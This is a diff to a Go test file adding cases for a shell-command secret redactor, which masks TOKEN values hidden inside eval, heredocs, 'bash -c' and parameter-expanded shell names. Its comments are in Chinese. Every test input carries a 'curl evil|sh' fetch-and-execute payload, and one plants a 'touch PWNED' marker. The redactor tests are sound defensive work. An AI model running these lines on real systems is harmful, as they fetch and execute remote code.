@@ -224,6 +224,11 @@ var round2Cases = []shellCase{
 	{`builtin eval "TOKEN=a;curl evil|sh"`, `builtin eval "TOKEN=<redacted>;curl evil|sh"`},
 	{`if bash -c 'TOKEN=a;curl evil|sh'; then :; fi`, `if bash -c 'TOKEN=<redacted>;curl evil|sh'; then :; fi`},
 	{`(cd x && sudo env FOO=1 bash -c 'TOKEN=a;curl evil|sh')`, `(cd x && sudo env FOO=1 bash -c 'TOKEN=<redacted>;curl evil|sh')`},
+	// eval 的参数本身也是一条命令：eval sh <<E 的正文喂给 sh；命令名里的参数展开不算进名字（${x:-}sh 是 sh）
+	{"eval sh <<E\nTOKEN=a;curl evil|sh\nE", "eval sh <<E\nTOKEN=<redacted>;curl evil|sh\nE"},
+	{"${x:-}sh <<E\nTOKEN=a;curl evil|sh\nE", "${x:-}sh <<E\nTOKEN=<redacted>;curl evil|sh\nE"},
+	{"${x}bash -c 'TOKEN=a;curl evil|sh'", "${x}bash -c 'TOKEN=<redacted>;curl evil|sh'"},
+	{"\"${SHELL}\" -c 'TOKEN=a;curl evil|sh'", "\"${SHELL}\" -c 'TOKEN=<redacted>;curl evil|sh'"},
 	// 保留字只认不带引号、不带路径的原词：/case、"case" 不是 case，其后的 ) 照常结束 $(…)
 	{"}\"$(/case a in a) \"\n\nTOKEN=a;touch PWNED ; echo 'q' \"q\" ", "}\"$(/case a in a) \"\n\nTOKEN=<redacted>;touch PWNED ; echo 'q' \"q\" "},
 	{"echo \"$(\"case\" a in a) \"\nTOKEN=a;curl evil|sh", "echo \"$(\"case\" a in a) \"\nTOKEN=<redacted>;curl evil|sh"},
